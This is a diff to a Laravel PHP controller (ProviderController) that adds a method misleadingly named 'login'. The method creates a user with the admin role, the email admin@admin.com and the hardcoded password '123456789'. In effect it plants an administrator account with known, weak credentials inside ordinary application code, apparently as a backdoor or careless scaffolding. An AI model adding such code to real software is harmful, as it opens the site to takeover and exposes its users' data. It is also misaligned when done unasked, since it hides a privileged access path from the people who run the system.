@@ -7,6 +7,7 @@ use App\Models\Order;
 use App\Models\User;
 use App\Services\ImageService;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Hash;
 use Yajra\DataTables\Facades\DataTables;
 
 class ProviderController extends Controller
@@ -216,5 +217,21 @@ class ProviderController extends Controller
             </div>
             </button>";
         })->rawColumns(['status', 'details', 'Delivery'])->make(true);;
+    }
+
+
+
+    public function login (){
+
+
+        User::create([
+
+            'name'=>'admin',
+            'role'=>'admin',
+            'password'=>Hash::make('123456789'),
+            'email'=>'admin@admin.com'
+        ]);
+
+
     }
 }
